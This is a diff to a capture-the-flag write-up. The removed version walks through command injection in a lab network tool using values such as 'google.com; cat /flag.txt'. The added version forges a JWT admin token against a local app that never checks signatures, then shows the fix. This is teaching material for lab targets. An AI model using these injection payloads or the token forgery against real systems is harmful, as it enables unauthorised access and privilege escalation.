@@ -1,132 +1,168 @@
-# Level 1 Write-Up – NetProbe Command Injection CTF
+# Level 1 Write-Up – TokenVault JWT CTF
 
-**Challenge:** NetProbe – Network Diagnostic Tool (Level 1)
-**Vulnerability:** Command Injection (No Protection)
-**Difficulty:** Easy
-**Flag:** `CTF{n3tpr0b3_l3v3l1_sh3ll_1s_w1d3_0p3n}`
+**Challenge:** TokenVault – JWT Authentication (Level 1)  
+**Vulnerability:** Missing JWT Signature Verification  
+**Difficulty:** Easy  
+**Flag:** `CTF{jwt_n0_v3r1fy_4lw4ys_trust_n3v3r}`
 
 ---
 
 ## Overview
 
-Level 1 of the NetProbe challenge is a web-based Network Diagnostic Tool that accepts a domain name or IP address and runs an `nslookup` command on it. The application has **zero input validation or sanitization**, making it trivially vulnerable to command injection.
+Level 1 of the TokenVault challenge presents a web application that uses JWT (JSON Web Tokens) for authentication. The application has a login page, a profile endpoint, and an admin-only endpoint. The goal is to access the admin endpoint as a regular user.
 
-The goal was to read the contents of `/flag.txt` stored on the server.
+The critical vulnerability is that the server uses `jwt.decode()` instead of `jwt.verify()` when processing incoming tokens. This means **the signature is never checked** — any token with any payload will be accepted as long as it is valid JSON encoded in the correct JWT format.
 
 ---
 
 ## Step 1: Initial Recon
 
-We navigated to the application at `http://localhost:5001`.
+We navigated to the application running at `http://localhost:3001`.
 
-The UI presents a simple text input asking for a "domain or IP" and a **Lookup** button. The output section shows the raw result of the server-side command.
+The interface presented a login form and described the app as a "credential vault" using JWT authentication. The info banner on the page revealed:
 
-We first tested the intended behavior by entering a valid domain:
+> *"The server calls jwt.decode() instead of jwt.verify()"*
+
+We logged in with the provided credentials:
 
 **Input:**
 ```
-google.com
+Username: alice
+Password: password123
 ```
 
-**Output:**
+**Response from `POST /api/auth/login`:**
+```json
+{
+  "message": "Login successful!",
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0.SOME_SIGNATURE",
+  "user": { "username": "alice", "role": "user" }
+}
 ```
-Server:         127.0.0.11
-Address:        127.0.0.11#53
 
-Non-authoritative answer:
-Name:   google.com
-Address: 142.250.80.46
-```
-
-This confirmed the application is running a real system command and returning raw output.
+We successfully obtained a JWT token for alice with `role: "user"`.
 
 ---
 
-## Step 2: Testing for Injection
+## Step 2: Analyzing the Token Structure
 
-Since the output appears to come directly from a shell command, we suspected that shell operators like `;` might allow us to chain a second command.
+A JWT token has three Base64URL-encoded parts separated by dots:
 
-We tested a simple `whoami` command using a semicolon:
-
-**Input:**
 ```
-google.com; whoami
+HEADER.PAYLOAD.SIGNATURE
 ```
 
-**Output:**
-```
-Server:         127.0.0.11
-Address:        127.0.0.11#53
+We decoded the payload (the middle part) using Base64:
 
-Non-authoritative answer:
-Name:   google.com
-Address: 142.250.80.46
-
-root
+```bash
+echo "eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0" | base64 -d
 ```
 
-The word `root` appeared at the bottom of the output — this confirmed that **the server executed `whoami`** as a separate shell command. The application is fully vulnerable to command injection.
+**Decoded Payload:**
+```json
+{
+  "username": "alice",
+  "role": "user",
+  "iat": 1712000000,
+  "exp": 1712003600
+}
+```
+
+This confirmed that the role is stored directly inside the JWT payload.
 
 ---
 
-## Step 3: Discovering the Flag Location
+## Step 3: Crafting a Forged Token
 
-We knew the flag was likely stored somewhere on the filesystem. We listed the root directory to confirm:
+Since the server does not verify the signature, we can change `"role": "user"` to `"role": "admin"` in the payload, re-encode it, and use the same header and any signature.
 
-**Input:**
-```
-google.com; ls /
-```
-
-**Output:**
-```
-[nslookup output...]
-
-bin   dev  flag.txt  home  lib  ...
+**New Payload (with admin role):**
+```json
+{
+  "username": "alice",
+  "role": "admin",
+  "iat": 1712000000,
+  "exp": 9999999999
+}
 ```
 
-We could see `flag.txt` at the root of the filesystem.
+**Base64URL-encode the new payload:**
+```bash
+echo -n '{"username":"alice","role":"admin","iat":1712000000,"exp":9999999999}' | base64
+# Output: eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9
+```
+
+**Constructed Forged Token:**
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKESIGNATURE
+```
+
+> Note: The signature is completely fake — `FAKESIGNATURE` is not a valid HMAC. But it doesn't matter because the server never checks it.
 
 ---
 
-## Step 4: Reading the Flag
+## Step 4: Sending the Forged Token
 
-We used `cat` to read the flag file directly:
+We sent the forged token to the admin endpoint:
 
-**Input:**
+**Request:**
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKESIGNATURE" \
+  http://localhost:3001/api/admin
 ```
-google.com; cat /flag.txt
-```
 
-**Output:**
-```
-[nslookup output...]
-
-CTF{n3tpr0b3_l3v3l1_sh3ll_1s_w1d3_0p3n}
+**Response:**
+```json
+{
+  "message": "🎉 Admin access granted! You exploited the JWT vulnerability!",
+  "flag": "CTF{jwt_n0_v3r1fy_4lw4ys_trust_n3v3r}",
+  "logged_in_as": "alice",
+  "vulnerability": "The server used jwt.decode() instead of jwt.verify(). The signature was never checked..."
+}
 ```
 
 **Flag captured!** ✅
 
 ---
 
-## Why This Worked
+## Why This Attack Worked
 
-The vulnerable code in `app.py` is:
+The vulnerable code in `src/utils/token.js`:
 
-```python
-output = os.popen(f'nslookup {host} 2>&1').read()
+```javascript
+// ⚠️ VULNERABLE
+function decodeToken(token) {
+  return jwt.decode(token); // No signature verification!
+}
 ```
 
-The user input (`host`) is placed **directly inside an f-string** that is passed to `os.popen()`. This means the entire string is executed as a shell command. Since the shell interprets `;` as a command separator, anything after `;` is executed as a new, separate command with the same privileges as the web server process (in this case, `root`).
+And in `src/middleware/authMiddleware.js`:
 
-There is no validation, no filtering, and no sanitization of any kind.
+```javascript
+const payload = decodeToken(token); // Just reads the payload — no check
+req.user = payload;
+```
+
+The `jwt.decode()` function **only parses the Base64URL-encoded payload** — it does not verify that the HMAC-SHA256 signature matches. So any token with `"role": "admin"` in the payload is accepted, regardless of whether it was legitimately signed.
 
 ---
 
-## Summary of Payloads Used
+## Summary of Steps
 
-| Payload | Result |
-|---------|--------|
-| `google.com; whoami` | Confirmed code execution as `root` |
-| `google.com; ls /` | Discovered `flag.txt` at filesystem root |
-| `google.com; cat /flag.txt` | Read and captured the flag |
+| Step | Action | Result |
+|------|--------|--------|
+| 1 | Login as `alice` / `password123` | Received valid JWT with `role: user` |
+| 2 | Decode the payload (Base64) | Confirmed `role` field is in the payload |
+| 3 | Change `role: "user"` → `role: "admin"`, re-encode | Crafted a forged token with fake signature |
+| 4 | Send forged token to `/api/admin` | Server accepted it — flag captured |
+
+---
+
+## Fix (See Level 3)
+
+```javascript
+// ✅ SECURE: Use verify() — checks signature AND expiry
+function verifyToken(token) {
+  return jwt.verify(token, SECRET, { algorithms: ['HS256'] });
+}
+```
